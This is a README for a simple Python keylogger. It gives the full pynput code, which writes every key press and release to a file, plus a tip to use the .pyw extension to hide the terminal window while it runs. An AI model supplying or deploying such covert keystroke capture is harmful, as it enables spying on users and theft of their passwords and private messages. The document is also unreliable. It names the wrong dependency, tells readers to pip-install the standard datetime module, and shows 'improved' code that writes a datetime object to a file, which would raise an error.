# Simple-Keylogger
A very simple keylogger written in python.

## Usage
You can simply run it like any other python file `python keylogger.py` or `python PATH TO FILE`
There is a requirement, though: `keyboard`
## Optional
Change the file extension from `.py` to `.pyw` to hide terminal window when running
Add datetime function
### Datetime
As you can see in my code, it has a `from datetime import datetime` function.
That is because we are going to make a `datetime` funciton.

**MAKE SURE YOU ALREADY HAVE DATETIME** 

#### Windows

`pip install datetime`

#### Linux

`pip install datetime`

#### Mac

`pip3 install datetime`

### Working with datetime

Our current code is
`from pynput.keyboard import Key, Listener
from datetime import datetime

txtfile = input('Type in your text file location: ')


def on_press(key):
    f = open(txtfile, "a")
    f.write('{0} pressed'.format(
        key))
    f.close()

def on_release(key):
    g = open(txtfile, "a")
    g.write('{0} release'.format(
        key))
    if key == Key.esc:

        return False


with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()`
If we want datetime, we could always add a `f.write(datetime.now()` into line9, column 5 and `g.write(datetime.now()` into line 16, column 5

The result should be 
`from pynput.keyboard import Key, Listener
from datetime import datetime

txtfile = input('Type in your text file location: ')


def on_press(key):
    f = open(txtfile, "a")
    f.write(datetime.now())
    f.write('{0} pressed'.format(
        key))
    f.close()

def on_release(key):
    g = open(txtfile, "a")
    g.write(datetime.now())
    g.write('{0} release'.format(
        key))
    if key == Key.esc:

        return False


with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()`
    
  
